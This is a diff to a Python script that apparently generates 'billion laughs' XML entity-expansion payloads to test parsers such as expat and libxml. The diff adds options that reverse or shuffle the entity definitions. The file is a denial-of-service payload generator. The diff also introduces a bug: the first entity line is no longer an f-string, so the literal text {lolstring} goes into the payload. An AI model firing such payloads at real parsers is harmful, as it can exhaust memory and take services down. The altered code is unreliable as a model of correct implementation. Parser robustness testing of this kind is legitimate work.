@@ -4,6 +4,7 @@
 import argparse
 import os
 import pathlib
+import random
 import secrets
 import subprocess
 import sys
@@ -19,6 +20,8 @@ ap.add_argument("--mode", default="expat", help="One of expat (default), libxml,
 ap.add_argument("--command", help="Command to use in 'custom' mode")
 ap.add_argument("--keep", action="store_true", help="Always keep files (even if not suspicious)")
 ap.add_argument("--runs", default=1, help="Number of runs")
+ap.add_argument("--flip", action="store_true")
+ap.add_argument("--shuffle", action="store_true")
 ap.add_argument("-o", "--out", default="out", help="Output directory")
 args = ap.parse_args()
 
@@ -30,12 +33,24 @@ for _ in range(int(args.runs)):
     multi = getrn()
     depth = getrn()
 
+    exploit = "<!DOCTYPE billion [\n"
+
     lolstring = "l" * length
-    exploit = f'<!DOCTYPE billion [ <!ENTITY a0 "{lolstring}">\n'
+    entitydef = ['<!ENTITY a0 "{lolstring}">\n']
 
     for j in range(depth):
         entities = f"&a{j};" * multi
-        exploit += f'<!ENTITY a{j + 1} "{entities}">\n'
+        entitydef.append(f'<!ENTITY a{j + 1} "{entities}">')
+
+    if args.flip:
+        entitydef = "\n".join(reversed(entitydef))
+    elif args.shuffle:
+        random.SystemRandom().shuffle(entitydef)
+        entitydef = "\n".join(entitydef)
+    else:
+        entitydef = "\n".join(entitydef)
+
+    exploit += entitydef
 
     exploit += f"]><x>&a{depth};</x>\n"
 
